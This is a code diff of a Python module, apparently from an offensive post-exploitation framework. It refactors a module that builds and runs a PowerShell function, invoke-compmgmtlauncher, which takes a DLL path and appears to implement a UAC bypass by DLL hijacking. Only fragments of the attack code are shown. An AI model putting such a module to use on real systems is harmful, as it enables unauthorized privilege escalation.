@@ -1,5 +1,4 @@
 from termcolor import colored, cprint
-from warrior_check import exist_warrior
 from module import Module
 
 
@@ -20,8 +19,7 @@ class CustomModule(Module):
 
     # This module must be always implemented, it is called by the run option
     def run_module(self):
-        if exist_warrior(self.args["warrior"]):
-            function = """function invoke-compmgmtlauncher{{
+        function = """function invoke-compmgmtlauncher{{
 param(
     [Parameter(Mandatory)]
     [string] $dll,
@@ -75,12 +73,5 @@ rm -Force $path1 -Recurse
 }}
 """.format(self.args["common-control"], self.args["dll"])
             
-            function += 'invoke-compmgmtlauncher -dll "{}" -base "{}"'.format(self.args["dll"], self.args["base"])
-
-            with open('/tmp/ibs-{}'.format(self.args["warrior"]), 'a') as f:
-                f.write(function)
-
-            cprint ('[+] Done!', 'green')
-
-        else:
-            cprint ('[!] Failed... Warrior don´t found', 'red')
+        function += 'invoke-compmgmtlauncher -dll "{}" -base "{}"'.format(self.args["dll"], self.args["base"])
+        super(CustomModule, self).run(function)
